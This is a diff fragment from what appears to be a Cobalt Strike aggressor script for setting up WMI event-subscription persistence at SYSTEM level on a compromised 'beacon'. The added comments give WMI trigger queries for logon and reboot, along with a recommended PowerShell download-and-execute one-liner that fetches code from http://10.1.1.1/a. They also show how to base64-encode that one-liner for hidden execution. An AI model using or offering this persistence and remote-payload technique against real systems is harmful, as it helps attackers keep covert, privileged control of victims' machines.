@@ -2,6 +2,15 @@
 #Author: @r3dQu1nn
 #Generates a Custom WMI Event using Powershell for SYSTEM Level persistence on selected beacon
 #Very syntax heavy, Test first before using on live targets
+#Sample Queries:
+## User Logon:
+#SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2
+## System UpTime (Reboot):
+#SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320
+#https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf
+##Recommended Encoded Payload: 
+#base 64 encode IEX of the powershell one liner ex: IEX (new-object net.webclient).downloadstring('http://10.1.1.1/a') > payload.txt
+#cat payload.txt | iconv --to-code=UTF-16LE | base64 -w 0
 
 sub persistwmievent  {
 	$bid = $1;
